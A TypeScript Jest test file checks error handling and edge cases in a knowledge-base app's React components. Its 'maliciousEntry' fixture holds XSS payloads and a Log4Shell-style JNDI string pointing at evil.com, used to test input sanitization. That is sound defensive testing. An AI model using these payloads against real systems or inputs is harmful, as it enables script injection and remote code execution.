/**
 * Error Handling and Edge Case Validation Tests
 * Comprehensive testing for error scenarios and edge cases
 */

import React from 'react';
import { render, screen, waitFor, act } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { AdvancedKBEntryList } from '../../src/renderer/components/ui/AdvancedKBEntryList';
import { SmartSearchInterface } from '../../src/renderer/components/ui/SmartSearchInterface';
import { KBEntryForm } from '../../src/renderer/components/forms/KBEntryForm';
import { BatchOperationsUI } from '../../src/renderer/components/ui/BatchOperationsUI';
import { EnhancedKnowledgeDBService } from '../../src/services/EnhancedKnowledgeDBService';
import { SmartSearchService } from '../../src/services/SmartSearchService';
import type { KBEntry } from '../../src/types';

// Mock services for error simulation
jest.mock('../../src/services/EnhancedKnowledgeDBService');
jest.mock('../../src/services/SmartSearchService');

// Error simulation utilities
class ErrorSimulator {
  static networkError(message = 'Network request failed') {
    return new Error(message);
  }

  static timeoutError(message = 'Request timed out') {
    const error = new Error(message);
    error.name = 'TimeoutError';
    return error;
  }

  static validationError(field: string, message: string) {
    const error = new Error(message);
    error.name = 'ValidationError';
    (error as any).field = field;
    return error;
  }

  static permissionError(message = 'Access denied') {
    const error = new Error(message);
    error.name = 'PermissionError';
    (error as any).statusCode = 403;
    return error;
  }

  static databaseError(message = 'Database connection failed') {
    const error = new Error(message);
    error.name = 'DatabaseError';
    return error;
  }

  static quotaExceededError(message = 'Storage quota exceeded') {
    const error = new Error(message);
    error.name = 'QuotaExceededError';
    return error;
  }
}

// Test utilities for edge cases
const EdgeCaseData = {
  emptyEntry: {
    id: '',
    title: '',
    problem: '',
    solution: '',
    category: '',
    tags: [],
    created_at: new Date(),
    updated_at: new Date(),
    usage_count: 0,
    success_rate: 0,
    version: 1,
    status: 'active',
    created_by: ''
  } as KBEntry,

  extremelyLongEntry: {
    id: 'long-entry',
    title: 'A'.repeat(1000),
    problem: 'B'.repeat(10000),
    solution: 'C'.repeat(10000),
    category: 'VSAM',
    tags: Array.from({ length: 100 }, (_, i) => `tag-${i}`),
    created_at: new Date(),
    updated_at: new Date(),
    usage_count: 999999,
    success_rate: 1,
    version: 999,
    status: 'active',
    created_by: 'D'.repeat(500)
  } as KBEntry,

  maliciousEntry: {
    id: '<script>alert("xss")</script>',
    title: '<img src=x onerror=alert("xss")>',
    problem: 'javascript:alert("xss")',
    solution: '${jndi:ldap://evil.com/exploit}',
    category: 'VSAM',
    tags: ['<script>', 'onload=alert(1)'],
    created_at: new Date(),
    updated_at: new Date(),
    usage_count: 0,
    success_rate: 0,
    version: 1,
    status: 'active',
    created_by: 'attacker'
  } as KBEntry,

  unicodeEntry: {
    id: 'unicode-test',
    title: '🚀 Unicode Test Entry 中文 العربية',
    problem: 'Émojis and spéciål charactërs: 🔥💾🔍',
    solution: 'Sølution with Ñiño and 漢字',
    category: 'Functional',
    tags: ['🏷️', 'émoji', '中文标签'],
    created_at: new Date(),
    updated_at: new Date(),
    usage_count: 42,
    success_rate: 0.85,
    version: 1,
    status: 'active',
    created_by: 'international-user'
  } as KBEntry,

  nullableEntry: {
    id: 'nullable-test',
    title: 'Test Entry',
    problem: 'Test problem',
    solution: 'Test solution',
    category: 'VSAM',
    tags: undefined as any,
    created_at: null as any,
    updated_at: undefined as any,
    usage_count: NaN,
    success_rate: Infinity,
    version: -1,
    status: null as any,
    created_by: undefined as any
  } as KBEntry
};

describe('Error Handling and Edge Cases', () => {
  let mockKBService: jest.Mocked<EnhancedKnowledgeDBService>;
  let mockSearchService: jest.Mocked<SmartSearchService>;
  let user: ReturnType<typeof userEvent.setup>;

  beforeEach(() => {
    user = userEvent.setup();

    mockKBService = new (EnhancedKnowledgeDBService as any)() as jest.Mocked<EnhancedKnowledgeDBService>;
    mockSearchService = new (SmartSearchService as any)() as jest.Mocked<SmartSearchService>;

    // Restore console methods to catch errors
    jest.spyOn(console, 'error').mockImplementation(() => {});
    jest.spyOn(console, 'warn').mockImplementation(() => {});
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('Network and Service Errors', () => {
    it('should handle network connection failures gracefully', async () => {
      mockKBService.getEntries.mockRejectedValue(ErrorSimulator.networkError());

      const { container } = render(
        <AdvancedKBEntryList
          entries={[]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
          service={mockKBService}
        />
      );

      // Should display error state
      await waitFor(() => {
        expect(screen.getByRole('alert')).toBeInTheDocument();
        expect(screen.getByText(/network request failed/i)).toBeInTheDocument();
      });

      // Should provide retry option
      const retryButton = screen.getByRole('button', { name: /retry/i });
      expect(retryButton).toBeInTheDocument();

      // Retry should work when service is restored
      mockKBService.getEntries.mockResolvedValue({ data: [], total: 0, hasMore: false });

      await user.click(retryButton);

      await waitFor(() => {
        expect(mockKBService.getEntries).toHaveBeenCalledTimes(2);
      });
    });

    it('should handle API timeout errors', async () => {
      mockSearchService.search.mockRejectedValue(ErrorSimulator.timeoutError());

      render(
        <SmartSearchInterface
          onSearch={() => {}}
          onSuggestionSelect={() => {}}
          searchService={mockSearchService}
        />
      );

      const searchInput = screen.getByRole('textbox', { name: /search/i });
      await user.type(searchInput, 'test query');
      await user.keyboard('{Enter}');

      // Should show timeout error
      await waitFor(() => {
        expect(screen.getByText(/request timed out/i)).toBeInTheDocument();
      });

      // Should fallback to local search
      await waitFor(() => {
        expect(screen.getByText(/using local search/i)).toBeInTheDocument();
      });
    });

    it('should handle service unavailable errors', async () => {
      const serviceError = new Error('Service temporarily unavailable');
      (serviceError as any).statusCode = 503;

      mockKBService.saveEntry.mockRejectedValue(serviceError);

      render(
        <KBEntryForm
          onSave={mockKBService.saveEntry}
          onCancel={() => {}}
          categories={['VSAM']}
        />
      );

      // Fill and submit form
      await testUtils.fillFormWithValidData(user);

      const saveButton = screen.getByRole('button', { name: /save/i });
      await user.click(saveButton);

      // Should show service unavailable message
      await waitFor(() => {
        expect(screen.getByText(/service temporarily unavailable/i)).toBeInTheDocument();
      });

      // Should suggest retry later
      expect(screen.getByText(/please try again later/i)).toBeInTheDocument();
    });

    it('should handle permission and authentication errors', async () => {
      mockKBService.deleteEntry.mockRejectedValue(ErrorSimulator.permissionError());

      const { container } = render(
        <AdvancedKBEntryList
          entries={[EdgeCaseData.unicodeEntry]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
          service={mockKBService}
        />
      );

      // Try to delete entry
      const deleteButton = screen.getByRole('button', { name: /delete/i });
      await user.click(deleteButton);

      // Confirm deletion
      const confirmButton = screen.getByRole('button', { name: /confirm/i });
      await user.click(confirmButton);

      // Should show permission error
      await waitFor(() => {
        expect(screen.getByText(/access denied/i)).toBeInTheDocument();
      });

      // Should suggest contacting administrator
      expect(screen.getByText(/contact administrator/i)).toBeInTheDocument();
    });

    it('should handle database connection failures', async () => {
      mockKBService.getEntries.mockRejectedValue(ErrorSimulator.databaseError());

      render(
        <AdvancedKBEntryList
          entries={[]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
          service={mockKBService}
        />
      );

      // Should show database error
      await waitFor(() => {
        expect(screen.getByText(/database connection failed/i)).toBeInTheDocument();
      });

      // Should show status indicator
      expect(screen.getByTestId('service-status-indicator')).toHaveClass('error');
    });
  });

  describe('Data Validation and Sanitization', () => {
    it('should sanitize potentially malicious input', async () => {
      const onSave = jest.fn();

      render(
        <KBEntryForm
          onSave={onSave}
          onCancel={() => {}}
          categories={['VSAM']}
          initialData={EdgeCaseData.maliciousEntry}
        />
      );

      const titleInput = screen.getByLabelText(/title/i);

      // Malicious content should be sanitized in display
      expect(titleInput.value).not.toContain('<script>');
      expect(titleInput.value).not.toContain('onerror');

      // Should prevent XSS in rendered content
      const { container } = render(
        <div dangerouslySetInnerHTML={{ __html: EdgeCaseData.maliciousEntry.title }} />
      );

      expect(container.innerHTML).not.toContain('<script>');
    });

    it('should handle extremely long input gracefully', async () => {
      render(
        <KBEntryForm
          onSave={() => Promise.resolve()}
          onCancel={() => {}}
          categories={['VSAM']}
          initialData={EdgeCaseData.extremelyLongEntry}
        />
      );

      // Form should still render
      expect(screen.getByLabelText(/title/i)).toBeInTheDocument();

      // Long content should be truncated or scrollable
      const problemTextarea = screen.getByLabelText(/problem/i) as HTMLTextAreaElement;
      expect(problemTextarea.value.length).toBeGreaterThan(0);

      // Should show character count warning
      await waitFor(() => {
        expect(screen.getByText(/exceeds recommended length/i)).toBeInTheDocument();
      });
    });

    it('should handle null and undefined values safely', async () => {
      const { container } = render(
        <AdvancedKBEntryList
          entries={[EdgeCaseData.nullableEntry]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
        />
      );

      // Should render without crashing
      expect(container).toBeInTheDocument();

      // Should handle null/undefined gracefully
      expect(screen.getByText('Test Entry')).toBeInTheDocument();

      // Should show fallback values for missing data
      const entryElement = screen.getByTestId(/kb-entry-/);
      expect(entryElement).toBeInTheDocument();
    });

    it('should support Unicode and internationalization', async () => {
      const { container } = render(
        <AdvancedKBEntryList
          entries={[EdgeCaseData.unicodeEntry]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
        />
      );

      // Should display Unicode characters correctly
      expect(screen.getByText(/🚀 Unicode Test Entry 中文 العربية/)).toBeInTheDocument();
      expect(screen.getByText(/Émojis and spéciål charactërs/)).toBeInTheDocument();

      // Should handle Unicode in search
      const searchInput = screen.getByRole('textbox', { name: /search/i });
      await user.type(searchInput, '中文');

      expect(searchInput.value).toBe('中文');
    });

    it('should validate form data integrity', async () => {
      const onSave = jest.fn().mockRejectedValue(
        ErrorSimulator.validationError('title', 'Title is required')
      );

      render(
        <KBEntryForm
          onSave={onSave}
          onCancel={() => {}}
          categories={['VSAM']}
        />
      );

      // Submit empty form
      const saveButton = screen.getByRole('button', { name: /save/i });
      await user.click(saveButton);

      // Should show validation errors
      await waitFor(() => {
        expect(screen.getByText(/title is required/i)).toBeInTheDocument();
        expect(screen.getByLabelText(/title/i)).toHaveAttribute('aria-invalid', 'true');
      });

      // Error should be associated with field
      const titleInput = screen.getByLabelText(/title/i);
      expect(titleInput.getAttribute('aria-describedby')).toContain('error');
    });
  });

  describe('Browser and Environment Edge Cases', () => {
    it('should handle browser storage quota exceeded', async () => {
      const originalLocalStorage = window.localStorage;

      // Mock localStorage to throw quota error
      Object.defineProperty(window, 'localStorage', {
        value: {
          ...originalLocalStorage,
          setItem: jest.fn(() => {
            throw ErrorSimulator.quotaExceededError();
          })
        }
      });

      render(
        <KBEntryForm
          onSave={() => Promise.resolve()}
          onCancel={() => {}}
          categories={['VSAM']}
          enableDrafts={true}
        />
      );

      const titleInput = screen.getByLabelText(/title/i);
      await user.type(titleInput, 'Test title');

      // Should handle storage error gracefully
      await waitFor(() => {
        expect(screen.getByText(/unable to save draft/i)).toBeInTheDocument();
      });

      // Restore original localStorage
      Object.defineProperty(window, 'localStorage', { value: originalLocalStorage });
    });

    it('should handle offline scenarios', async () => {
      // Mock offline status
      Object.defineProperty(navigator, 'onLine', {
        writable: true,
        value: false
      });

      render(
        <SmartSearchInterface
          onSearch={() => {}}
          onSuggestionSelect={() => {}}
          aiEnabled={true}
        />
      );

      // Should show offline indicator
      expect(screen.getByText(/offline mode/i)).toBeInTheDocument();

      // AI features should be disabled
      expect(screen.getByText(/ai search unavailable/i)).toBeInTheDocument();

      // Restore online status
      Object.defineProperty(navigator, 'onLine', { value: true });
    });

    it('should handle window resize and responsive breakpoints', async () => {
      const { container } = render(
        <AdvancedKBEntryList
          entries={Array.from({ length: 100 }, (_, i) => ({
            ...EdgeCaseData.unicodeEntry,
            id: `entry-${i}`,
            title: `Entry ${i}`
          }))}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
        />
      );

      // Simulate mobile viewport
      global.innerWidth = 320;
      global.dispatchEvent(new Event('resize'));

      await waitFor(() => {
        // Should adapt layout for mobile
        const mobileLayout = container.querySelector('.mobile-layout');
        expect(mobileLayout).toBeInTheDocument();
      });

      // Simulate desktop viewport
      global.innerWidth = 1920;
      global.dispatchEvent(new Event('resize'));

      await waitFor(() => {
        // Should show desktop layout
        const desktopLayout = container.querySelector('.desktop-layout');
        expect(desktopLayout).toBeInTheDocument();
      });
    });

    it('should handle memory pressure and garbage collection', async () => {
      const initialMemory = performance.memory?.usedJSHeapSize || 0;

      // Create large dataset that might cause memory pressure
      const largeDataset = Array.from({ length: 10000 }, (_, i) => ({
        ...EdgeCaseData.extremelyLongEntry,
        id: `large-${i}`,
        title: `Large Entry ${i}`,
        problem: 'X'.repeat(1000),
        solution: 'Y'.repeat(1000)
      }));

      const { unmount } = render(
        <AdvancedKBEntryList
          entries={largeDataset}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
        />
      );

      // Component should handle large dataset
      expect(screen.getByTestId('virtual-scroll-container')).toBeInTheDocument();

      // Cleanup
      unmount();

      // Force garbage collection if available
      if ((global as any).gc) {
        (global as any).gc();
      }

      const finalMemory = performance.memory?.usedJSHeapSize || 0;
      const memoryIncrease = finalMemory - initialMemory;

      // Should not leak excessive memory (allow some tolerance)
      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024); // 100MB
    });
  });

  describe('Concurrent Operations and Race Conditions', () => {
    it('should handle concurrent search requests', async () => {
      let searchCount = 0;
      mockSearchService.search.mockImplementation(async () => {
        searchCount++;
        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
        return { results: [], aiEnhanced: false, suggestions: [] };
      });

      render(
        <SmartSearchInterface
          onSearch={() => {}}
          onSuggestionSelect={() => {}}
          searchService={mockSearchService}
        />
      );

      const searchInput = screen.getByRole('textbox', { name: /search/i });

      // Fire multiple rapid searches
      const searches = ['query1', 'query2', 'query3', 'query4'];

      for (const query of searches) {
        await user.clear(searchInput);
        await user.type(searchInput, query);
        await user.keyboard('{Enter}');
      }

      await waitFor(() => {
        // Should have handled all searches
        expect(searchCount).toBe(searches.length);
      });

      // Should show results for latest search only
      expect(screen.queryByText(/showing results for "query3"/i)).not.toBeInTheDocument();
      await waitFor(() => {
        expect(screen.getByText(/showing results for "query4"/i)).toBeInTheDocument();
      });
    });

    it('should handle concurrent save operations', async () => {
      let saveAttempts = 0;
      const onSave = jest.fn().mockImplementation(async () => {
        saveAttempts++;
        if (saveAttempts > 1) {
          throw new Error('Concurrent modification detected');
        }
        await new Promise(resolve => setTimeout(resolve, 100));
        return { id: 'saved-entry', success: true };
      });

      render(
        <KBEntryForm
          onSave={onSave}
          onCancel={() => {}}
          categories={['VSAM']}
        />
      );

      await testUtils.fillFormWithValidData(user);

      const saveButton = screen.getByRole('button', { name: /save/i });

      // Rapid double-click on save
      await user.dblClick(saveButton);

      // Should prevent duplicate saves
      await waitFor(() => {
        expect(onSave).toHaveBeenCalledTimes(1);
      });

      // Or handle concurrent modification gracefully
      if (saveAttempts > 1) {
        await waitFor(() => {
          expect(screen.getByText(/concurrent modification detected/i)).toBeInTheDocument();
        });
      }
    });

    it('should handle component unmounting during async operations', async () => {
      mockKBService.getEntries.mockImplementation(async () => {
        await new Promise(resolve => setTimeout(resolve, 1000));
        return { data: [], total: 0, hasMore: false };
      });

      const { unmount } = render(
        <AdvancedKBEntryList
          entries={[]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
          service={mockKBService}
        />
      );

      // Unmount before async operation completes
      setTimeout(() => unmount(), 100);

      // Should not cause memory leaks or unhandled promise rejections
      await new Promise(resolve => setTimeout(resolve, 1500));

      // No console errors should have been logged
      expect(console.error).not.toHaveBeenCalledWith(
        expect.stringContaining('memory leak')
      );
    });
  });

  describe('Performance Degradation Scenarios', () => {
    it('should handle slow rendering gracefully', async () => {
      // Mock slow component rendering
      const SlowComponent = () => {
        // Simulate heavy computation
        const heavyComputation = () => {
          let result = 0;
          for (let i = 0; i < 1000000; i++) {
            result += Math.random();
          }
          return result;
        };

        React.useMemo(() => heavyComputation(), []);

        return <div>Slow component rendered</div>;
      };

      const startTime = performance.now();

      render(
        <div>
          <SlowComponent />
          <AdvancedKBEntryList
            entries={[EdgeCaseData.unicodeEntry]}
            onSelectEntry={() => {}}
            onEditEntry={() => {}}
            onDeleteEntry={() => {}}
          />
        </div>
      );

      const endTime = performance.now();
      const renderTime = endTime - startTime;

      // Should complete rendering within reasonable time
      expect(renderTime).toBeLessThan(2000); // 2 seconds max

      // Content should still be accessible
      expect(screen.getByText('Slow component rendered')).toBeInTheDocument();
      expect(screen.getByText(/unicode test entry/i)).toBeInTheDocument();
    });

    it('should handle CPU throttling scenarios', async () => {
      // Simulate CPU throttling by adding artificial delays
      const originalSetTimeout = window.setTimeout;
      window.setTimeout = ((callback: any, delay: number = 0) => {
        return originalSetTimeout(callback, delay * 2); // Double all delays
      }) as any;

      render(
        <SmartSearchInterface
          onSearch={() => {}}
          onSuggestionSelect={() => {}}
          debounceMs={100}
        />
      );

      const searchInput = screen.getByRole('textbox', { name: /search/i });

      const startTime = performance.now();
      await user.type(searchInput, 'throttled search');

      // Should still be responsive despite throttling
      const endTime = performance.now();
      expect(endTime - startTime).toBeLessThan(5000); // 5 seconds max

      // Restore original setTimeout
      window.setTimeout = originalSetTimeout;
    });
  });

  describe('Accessibility Error Scenarios', () => {
    it('should handle screen reader navigation errors', async () => {
      render(
        <AdvancedKBEntryList
          entries={[EdgeCaseData.nullableEntry]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
        />
      );

      // Simulate screen reader trying to navigate broken element
      const brokenElement = screen.getByTestId(/kb-entry-/);

      // Should have fallback accessible name
      expect(
        brokenElement.getAttribute('aria-label') ||
        brokenElement.textContent
      ).toBeTruthy();

      // Should be focusable
      await user.tab();
      expect(brokenElement).toHaveFocus();
    });

    it('should handle high contrast mode failures', async () => {
      // Force high contrast mode
      document.documentElement.style.filter = 'contrast(200%) brightness(150%)';

      const { container } = render(
        <AdvancedKBEntryList
          entries={[EdgeCaseData.unicodeEntry]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
        />
      );

      // Content should still be readable
      expect(screen.getByText(/unicode test entry/i)).toBeInTheDocument();

      // Elements should maintain sufficient contrast
      const entry = screen.getByTestId(/kb-entry-/);
      const computedStyle = window.getComputedStyle(entry);

      expect(computedStyle.color).not.toBe(computedStyle.backgroundColor);

      // Reset styles
      document.documentElement.style.filter = '';
    });
  });

  describe('Recovery and Resilience', () => {
    it('should recover from component crashes using error boundaries', async () => {
      const ThrowingComponent = ({ shouldThrow }: { shouldThrow: boolean }) => {
        if (shouldThrow) {
          throw new Error('Component crashed');
        }
        return <div>Component working</div>;
      };

      const ErrorBoundary = ({ children }: { children: React.ReactNode }) => {
        const [hasError, setHasError] = React.useState(false);

        React.useEffect(() => {
          const errorHandler = () => setHasError(true);
          window.addEventListener('error', errorHandler);
          return () => window.removeEventListener('error', errorHandler);
        }, []);

        if (hasError) {
          return (
            <div role="alert">
              <h2>Something went wrong</h2>
              <button onClick={() => setHasError(false)}>Try again</button>
            </div>
          );
        }

        return <>{children}</>;
      };

      const { rerender } = render(
        <ErrorBoundary>
          <ThrowingComponent shouldThrow={false} />
        </ErrorBoundary>
      );

      expect(screen.getByText('Component working')).toBeInTheDocument();

      // Trigger error
      rerender(
        <ErrorBoundary>
          <ThrowingComponent shouldThrow={true} />
        </ErrorBoundary>
      );

      // Should show error boundary
      await waitFor(() => {
        expect(screen.getByText('Something went wrong')).toBeInTheDocument();
      });

      // Should allow recovery
      const tryAgainButton = screen.getByRole('button', { name: /try again/i });
      await user.click(tryAgainButton);

      rerender(
        <ErrorBoundary>
          <ThrowingComponent shouldThrow={false} />
        </ErrorBoundary>
      );

      await waitFor(() => {
        expect(screen.getByText('Component working')).toBeInTheDocument();
      });
    });

    it('should handle automatic retry with exponential backoff', async () => {
      let attemptCount = 0;
      const maxAttempts = 3;

      mockKBService.getEntries.mockImplementation(async () => {
        attemptCount++;
        if (attemptCount < maxAttempts) {
          throw ErrorSimulator.networkError('Temporary failure');
        }
        return { data: [EdgeCaseData.unicodeEntry], total: 1, hasMore: false };
      });

      render(
        <AdvancedKBEntryList
          entries={[]}
          onSelectEntry={() => {}}
          onEditEntry={() => {}}
          onDeleteEntry={() => {}}
          service={mockKBService}
          autoRetry={true}
          maxRetries={maxAttempts}
        />
      );

      // Should eventually succeed after retries
      await waitFor(() => {
        expect(screen.getByText(/unicode test entry/i)).toBeInTheDocument();
      }, { timeout: 5000 });

      expect(attemptCount).toBe(maxAttempts);
    });
  });
});